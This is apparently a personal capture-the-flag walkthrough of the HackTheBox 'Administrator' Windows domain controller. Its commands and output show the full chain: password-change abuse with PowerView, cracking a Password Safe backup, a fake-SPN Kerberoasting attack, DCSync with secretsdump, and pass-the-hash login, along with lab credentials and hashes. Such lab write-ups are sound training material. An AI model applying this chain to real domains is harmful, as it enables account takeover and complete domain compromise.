---
created: 2025-08-26
---

📅 `2025-08-26`

#active-directory #bloodhound #change-password #ftp #password-vault #kerberoasting #dcsync

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Administrator`    |
| --------------- | --- |
| 📆 Release Date |  `2024-11-09`   |
| 🌐 IP Address   | `10.10.11.42`    |
| 🖥️ OS           | `Windows`    |
| 🎯 Difficulty   |   `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Active Directory
- Assumed breach
- `BloodHound`
- Changing other users' passwords
- `Password Safe 3` password database
- `Kerberoasting`
- `DCSync`

**🛠️ Tools:**  

- `NetExec`
- `Evil-WinRM`
- `BloodHound`
- `PowerView`
- `Hashcat`

**📚 Learned:**  

- Change permissions on users.
- Get hints from the group names.
- Try `FTP` on `NetExec`.
- Set fake `SPN` for `Kerberoasting`.
- `DCSync` with `NetExec`.

----

## 🌐 Port Scan

- **TCP**: [[Domain Controller Ports]], 21 (`FTP`)
- **UDP**: Nothing important

---

## 👤 User

This machine is an assumed breach scenario, so we're given credentials. We have user `olivia` with password `ichliebedich`.

First, I looked for shares.

```shell
$ nxc smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.42     445    DC               [+] administrator.htb\:
<SNIP>
```

There was nothing important. I enumerated `WinRM` and found `olivia` could `WinRM` into the machine, so I did that with `evil-winrm-py`, uploaded `sharphound` and ran it.

```shell
evil-winrm-py -i 10.10.11.42 -u Olivia -p ichliebedich
```

```shell
evil-winrm-py PS C:\Temp> upload /opt/sharphound/sharphound.exe ./
evil-winrm-py PS C:\Temp> dir C:\Temp

    Directory: C:\Temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/26/2025   4:15 AM          26139 20250826041526_BloodHound.zip
-a----         8/26/2025   4:15 AM           1428 NDI3ZmMyMGItNzc4Ny00MzE1LTllNDItYTM4YTEzYjcyZDFj.bin
-a----         8/26/2025   4:15 AM        1286656 sharphound.exe
```

I found this path:

![[Pasted image 20250826080134.png]]

![[Pasted image 20250826081446.png]]

User `olivia` can change user `michael`'s password and `michael` can change the password of `benjamin`, who is a member of the `Share Moderators` group. This group sounds interesting.

>[!tip]
>It can be hard to find the exact path we want. This came from the "Shortest paths from Owned objects" query, which returned a large graph, so I had to zoom in.

Let's load `PowerView` and change user `michael`'s password.

```shell
*Evil-WinRM* PS C:\Temp> powerview.ps1
*Evil-WinRM* PS C:\Temp> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> Set-DomainU{serPassword -Identity michael -AccountPassword $UserPassword
```

And it worked.

```shell
nxc smb 10.10.11.42 -u 'michael' -p 'Password123!'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:Password123!
```

This user could also `WinRM` into the machine. I logged in as `michael` and changed `benjamin`'s password.

```shell
evil-winrm -i 10.10.11.42 -u Michael -p Password123! -s /opt/powershell-modules
*Evil-WinRM* PS C:\Temp> powerview.ps1
*Evil-WinRM* PS C:\Temp> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
```

Apparently, user `benjamin` has no `WinRM` permissions, and the machine has no `RDP` enabled, but remember the machine has the `FTP` port open, and the group name hints it has something to do with moderating shared files. Let's try logging in via `FTP`.

>[!tip]
>If we can't log in as a user, think about what else that user can do for us. Here, the machine had an `FTP` server listening, and the group name hinted that the user could access it.

```shell
nxc ftp 10.10.11.42 -u 'benjamin' -p 'Password123!'
FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:Password123!
```

That gave us `FTP` access.

```shell
ftp 10.10.11.42
Name (10.10.11.42:asdf): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49189|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
```

There's a backup file, so I downloaded it.

```shell
ftp> binary
200 Type set to I.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||49197|)
150 Opening BINARY mode data connection.
100% |**************************************************************************************************************************************************|   952        8.26 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (8.25 KiB/s)
ftp> exit
221 Goodbye.
```

Now let's investigate this format.

The format is for the ["Password Safe"](https://pwsafe.org/) password manager. `.psafe3` is this manager's password database format. I installed it on my local Windows machine, and importing the database asks for a master password. I found we can use `hashcat` to crack this file's password. No need for a `*2john` binary.

```shell
.\hashcat.exe -a 0 -m 5200 .\Backup.psafe3 .\rockyou.txt -O -w 4

<SNIP>

.\Backup.psafe3:tekieromucho

<SNIP>
```

The master password is `tekieromucho`.

>[!tip]
>The password manager blocks screenshots of its `GUI`, presumably for security reasons.

It has 3 users: `alexander`, `emily`, and `emma`. I copied these users' credentials to a file called `creds.txt` on my attack host.

```txt
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Next, I tried to log in with them.

I attempted all 3 credentials with `NetExec` and only `emily` worked. I tested her credentials with `WinRM` too and she can `WinRM` into the machine.

```shell
nxc winrm 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

Credentials:

- `emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

And this user has the user flag:

```shell
*Evil-WinRM* PS C:\Users\emily> tree /F
Folder PATH listing
Volume serial number is 6131-DE70
C:.
+---3D Objects
+---Contacts
+---Desktop
¦       Microsoft Edge.lnk
¦       user.txt
¦
+---Documents
+---Downloads
<SNIP>
```

```shell
*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls
    Directory: C:\Users\emily\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         8/24/2025  10:30 PM             34 user.txt
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
<REDACTED>
```

Got user flag.

---

## 🛡️ Privilege Escalation

Running more queries in `BloodHound`, I found that user `ethan` can perform `DCSync`, so this user may give us domain compromise.

![[Pasted image 20250826085946.png]]

I found this permission for user `emily`:

![[Pasted image 20250826083843.png]]

>[!tip]
>I found this in the "Outbound Object Control" section of the node of user `emily`.

The `GenericWrite` permission can be used to create a fake `SPN` for `Kerberoasting`, so I did exactly that.

```shell
*Evil-WinRM* PS C:\Users\emily\Desktop> powerview.ps1
*Evil-WinRM* PS C:\Users\emily\Desktop> Set-DomainObject -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
```

>[!note]
>I load `PowerView` several times in this writeup because these are different sessions.

And now let's retrieve the ticket.

```shell
nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting output.txt
LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.11.42     389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
LDAP        10.10.11.42     389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.10.11.42     389    DC               [*] Total of records returned 1

<SNIP>

KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

And we get the error `KRB_AP_ERR_SKEW(Clock skew too great)`, caused by a mismatch between our system's clock and the target's. To fix it I used `rdate`. This tool can be used to set the system's date from a remote host with `NTP`. I installed the tool, disabled my `NTP`, and matched the remote host's date.

```shell
sudo timedatectl set-ntp off
sudo rdate -n 10.10.11.42
Tue Aug 26 15:47:48 -05 2025
```

And now let's try again.

```shell
nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting output.txt
LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.11.42     389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
LDAP        10.10.11.42     389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.10.11.42     389    DC               [*] Total of records returned 1
LDAP        10.10.11.42     389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 15:52:14.117811, lastLogon: <never>
LDAP        10.10.11.42     389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$0d0b38bdfc7bb4dd54bf543a8efc38bf$69d4757449e36b3c0ff6ab59344886b1954381201a32eb2c51f4179019ff78dc8545091aca9468d717ee2f8b3298e47cd8c2114b0ec2ebe1e3bb7b3d2ef55534f2a6d94c93d2935d22c8a8afa1f7471888cff9433996d8f85b2084db6fe55802b773e7975fdfad8fb56cd4d58e78251327df6510c6f8f014b3131ed0d092039c09729f6fb7d0e3fcded5c0f3443ef7dd80b04b82253c3f5ea4bc40f1870a81864853a5b9b3a64436c0f3a86ed5853938f4035a3d576beedb111d1f35177d4818fcc762dba34fbf4b3f7f0552a84c37ed8d3564b459002619e9c70d3053d1bc96e7920fec9e7fe4786222f51bc2869fc805952c97eaabe0873899792b3df592928f5fba00c14d397705084f109cf0c5498755a47372a23eaef02e9b585866b1d8fd02c9ff6b79445c0bd5f7ff7f3b7d5f1275939329eb6328f18c1aa2ad57fc033d19f1071f5d99e2358c3de07d454a04639410b82b47a3c0197abea5426b47172d7600b2e70ce13f3cbe5b23a83fa970381d4e873292f75ab964d73161e7a3f1f7872872e1548715ff8fca2d01618e8099d76e989f0beec853c6942638ac90cdb2a839adce4d2757e8e08eeb05d3e4fa0429e3504fd6bab5c44f5faf6acc6007660368f869a46371f2f0c9d1a84eb839f4c9a30c5a0a681050ccd8003d3b6bb28c75c16e1b51c1af05d3a1c83aeb7164dda3714e87eeabe487a013bd31219567d4485b8ba5404bbb106d42fdb4004079e7927c9327457981564bd73fae5becb1ddd0de24a43e136682c50721baf2a5622fed34ebc23172b642fb6432184e72f25bf4a7937d2fda4c1dda75aef9e94c4faa9058742feb519f0559ec3974549cb4f353b43c03906406f74df7ad864dc5ddfaacfe79b50e0066ad54b721191e52469072e00d9b171365ebc96ef0fc8f35c4993480a490f65f35fc063a41aa0dddba08089ce0cbd1658473b515d73912da2ef08e9f4149ad79f1bde99dcd67d4aa4923dc76280bcb8ddafa68a39eafe54aa755b37e3e88b2ef1e289762a39c3b204eec59caf7a5f20ceb97b05493b7849f4641079633e7f579feb8c28fceb59637fd8b97924ef7ae65ac44b020c6cf8ecc28970f9f371b6e7570457a487a931c75b8ee25563c83237ea7ffdafcb53f6eaf0b15ef92a6cf5a38c4224014fd271eeca997030d734e9ed7383f180226bfac510c77de9558ab13eb6f7ee47b2e48aa01e9c6f7ec654b98140d0a9c02c46b3217100982814dc9f8f3642245f44c7c49cde65546e2a728ca6b26c30fc56d80772d656cc4329bd5c76e8d440b2a6ffd6f4d56e16e9f437893e07439efddbf5edb0b8e3debc664ffcc4b961728897df4e72553ba14b789d1b38ad93d48f0f4c121a96db3a7e22fce16d34715b1ae1c903ddef2df07a527f713c8d1bb3258557b2b9dc038d97e639072b28b435fd548a23947349fddf6a2c5a76db974f6a563b45128b206d16b26509216387521f5e554ebcc406d3f5edc342c3ac0ba1f1e4797ca0920bb14db54f9ce0e9b1f5745de19e2f4
```

We got the ticket, which I cracked with `hashcat` mode 13100 (`Kerberoasting`).

```shell
.\hashcat.exe -a 0 -m 13100 .\hashes.txt .\rockyou.txt -O -w 4

<SNIP>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$0d...:limpbizkit

<SNIP>
```

And we got credentials for `ethan`.

- `ethan`:`limpbizkit`

```shell
nxc smb 10.10.11.42 -u 'ethan' -p 'limpbizkit'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit
```

Now I could run `DCSync`.

```shell
impacket-secretsdump administrator.htb/ethan:limpbizkit@DC.administrator.htb
/home/asdf/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
<SNIP>
```

And let's log in as administrator with the `NTLM` hash.

```shell
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -s /opt/powershell-modules

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/24/2025  10:30 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
<REDACTED>
```

Rooted.